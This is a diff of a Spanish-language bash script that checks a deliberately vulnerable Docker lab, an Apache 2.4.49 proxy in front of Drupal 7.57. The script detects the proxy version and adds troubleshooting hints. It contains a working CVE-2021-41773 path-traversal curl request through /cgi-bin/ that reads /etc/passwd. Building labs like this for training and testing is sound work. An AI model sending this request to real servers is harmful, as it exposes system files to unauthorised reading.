@@ -13,16 +13,33 @@ echo "== Objetivo: $BASE =="
 echo "-- Capa 1 (deteccion de stack) --"
 # En paginas normales el proxy deja pasar el header Server del BACKEND (2.4.10). Una URL mal formada
 # la contesta el propio proxy, y ahi si aparece su version real (2.4.49).
-server=$(curl -s -I --path-as-is "$BASE/%zz" | tr -d '\r' | awk -F': ' 'tolower($1)=="server"{print $2}')
-echo "  Server (proxy, via error 400): ${server:-<vacio>}"
-case "$server" in *2.4.49*) chk OK "Apache 2.4.49 detectado en el proxy";; *) chk FAIL "No se ve Apache 2.4.49 en el header Server";; esac
+hdr_norm=$(curl -s -I "$BASE/" | tr -d '\r' | awk -F': ' 'tolower($1)=="server"{print $2}')
+hdr_proxy=$(curl -s -I --path-as-is "$BASE/%zz" | tr -d '\r' | awk -F': ' 'tolower($1)=="server"{print $2}')
+echo "  Server en pagina normal (backend): ${hdr_norm:-<vacio>}"
+echo "  Server via error 400 (proxy):      ${hdr_proxy:-<vacio>}"
+PROXY_OK=0
+case "$hdr_proxy" in
+  *2.4.49*) chk OK "Apache 2.4.49 detectado en el proxy"; PROXY_OK=1;;
+  *)
+    chk FAIL "No llegas al proxy 2.4.49 (el error 400 reporta '${hdr_proxy:-vacio}')"
+    echo "     >> Causa probable: el puerto publicado apunta DIRECTO a 'drupal', no al 'proxy'."
+    echo "        Revisa:  docker compose ps        (el puerto debe estar en revital-proxy)"
+    echo "        y que NINGUN compose.override.yml publique el puerto contra 'drupal'."
+    echo "        Mientras no llegues al proxy, CVE-2021-41773 tampoco se reproduce (misma causa).";;
+esac
 code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/CHANGELOG.txt")
 if [ "$code" = "200" ] && curl -s "$BASE/CHANGELOG.txt" | grep -qi "Drupal 7.57"; then chk OK "Drupal 7.57 visible en /CHANGELOG.txt"; else pend "No se confirma Drupal 7.57 en /CHANGELOG.txt (codigo $code) -- puede faltar instalar Drupal"; fi
 
 echo "-- CVE-2021-41773 (Apache 2.4.49, lectura de archivos) --"
 # El PoC va por /cgi-bin/ (ScriptAlias real). Por /icons/ NO funciona en este montaje.
 body=$(curl -s --path-as-is "$BASE/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
-if echo "$body" | grep -q "root:.*:0:0:"; then chk OK "Path traversal por /cgi-bin/ lee /etc/passwd (VULNERABLE)"; else chk FAIL "No se pudo leer /etc/passwd por /cgi-bin/ (reviso Require all granted + mod_cgi)"; fi
+if echo "$body" | grep -q "root:.*:0:0:"; then
+  chk OK "Path traversal por /cgi-bin/ lee /etc/passwd (VULNERABLE)"
+elif [ "$PROXY_OK" = "0" ]; then
+  chk FAIL "No se reproduce porque no estas llegando al proxy 2.4.49 (ver diagnostico de arriba)"
+else
+  chk FAIL "No se pudo leer /etc/passwd por /cgi-bin/ (revisa 'Require all granted' en el Dockerfile y usa curl --path-as-is)"
+fi
 
 echo "-- Estado de Drupal --"
 loc=$(curl -s -o /dev/null -w '%{redirect_url}' "$BASE/")
